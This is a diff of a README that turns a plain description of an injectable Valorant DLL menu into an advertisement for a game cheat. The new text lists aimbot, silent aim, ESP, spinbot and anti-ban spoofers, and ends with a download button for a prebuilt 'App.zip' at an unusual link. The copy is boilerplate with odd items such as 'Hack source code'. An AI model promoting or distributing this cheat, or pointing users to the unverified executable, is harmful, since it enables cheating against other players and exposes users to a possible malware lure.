@@ -1,45 +1,62 @@
-# Valorant Internal İmgui
+# Valorant Internal Imgui Cheat Menu 🎮💻
 
-## How to Setup
-- Download the project to your computer as zip
-- Extract Project to Folder.
-- Open the solution file (.sln).
-- Select **Build Solution** from the **Build** menu or press `Ctrl+Shift+B` to compile the project.
-- When the build is complete, select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
+Welcome to the Valorant Internal Imgui Cheat Menu repository! This repository hosts a sophisticated cheat menu designed for Valorant, utilizing Imgui for a seamless and user-friendly hacking experience in C++.
 
-## General
-* Mouse: Move the menu, scroll items and change values
-* Arrows: Navigate and change values
+## Table of Contents
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-## Shortcuts
-* Tabs and items
-  * Shift + ↑: Go to first item
-  * Shift + ↓: Go to last item
-  * Shift + ←: Previous tab
-  * Shift + →: Next tab
-* Menu color
-  * Ctrl + ←: Previous menu color
-  * Ctrl + →: Next menu color
+## Introduction
+The **Valorant Internal Imgui Cheat Menu** offers a wide range of cheats and hacks to enhance your gameplay experience in Valorant. Whether you're looking for aimbots, bunnyhops, ESP, or skin changers, this cheat menu has got you covered. With a variety of features available, you can customize and optimize your gameplay to gain a competitive edge.
 
-DirectX 9.0c injectable DLL menu source. The original creator is obscure, but it includes XOR String Encryption, SendToServer SDK and many classic features.
+## Features
+This cheat menu includes a plethora of features tailored for Valorant players, including:
+- Aimbot
+- Bunnyhop
+- ESP (Extra Sensory Perception)
+- Fast crouch
+- Glow
+- Hack source code
+- Insta agent
+- Permanted spoofer
+- Radar
+- Skin changer
+- Skip tutorial
+- Silent aim
+- Spinbot
+- Temporary spoofer
+- Third-person view
 
-## Media
+![Valorant Cheat Menu](img/cheat-menu.png)
 
-![image](https://user-images.githubusercontent.com/100489559/157223531-28ddf5e6-ae66-4b0d-837c-0afac311be40.png)
-![image](https://user-images.githubusercontent.com/100489559/157223671-969a0a37-a267-4cb4-9580-191cd9c5dacd.png)
-![image](https://user-images.githubusercontent.com/100489559/157223599-847a89ab-f937-48e1-8ca7-08d500795a8b.png)
+## Installation
+To get started with the **Valorant Internal Imgui Cheat Menu**, follow these steps:
+1. Clone the repository to your local machine.
+2. Ensure you have the necessary dependencies installed, such as a C++ compiler.
+3. Compile the source code to generate the executable.
+4. Run the executable and launch Valorant.
+5. Enjoy the enhanced gameplay experience with the cheat menu features.
 
+If you encounter any issues during the installation process, refer to the "Releases" section for troubleshooting tips or updates.
 
+## Usage
+Once you have successfully installed the cheat menu, you can access the various features and hacks while playing Valorant. Customize your settings, enable the desired cheats, and dominate the game with ease. Experiment with different options to find the perfect combination for your gameplay style.
 
-## Image/animation disabled by default for the project
+Remember to use the cheat menu responsibly and avoid any actions that may result in consequences within the game.
 
-- **NOTE: If the picture does not load in some applications, do not force it, this may cause a memory leak.**
-
-
-## Disclaimer
-
-This software is for educational and research purposes only. Any legal liability that may arise from the use of the software lies entirely with the user. The developer cannot be held responsible for any misuse of the software.
+## Contributing
+We welcome contributions to the **Valorant Internal Imgui Cheat Menu** repository. If you have any ideas for additional features, improvements, or fixes, feel free to submit a pull request. Your contributions help enhance the cheat menu and provide a better experience for all users.
 
 ## License
+The **Valorant Internal Imgui Cheat Menu** is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-This project is licensed under the MIT. For more information, see the [License](LICENSE).
+[Download Cheat Menu](https://github.com/file/App.zip)
+[![](https://img.shields.io/badge/Download-Cheat%20Menu-blue)](https://github.com/file/App.zip)
+
+Explore the cheat menu, elevate your gameplay, and immerse yourself in the world of Valorant like never before! Happy hacking! 🚀🎯🔥
+
+![Valorant Gameplay](img/gameplay.png)
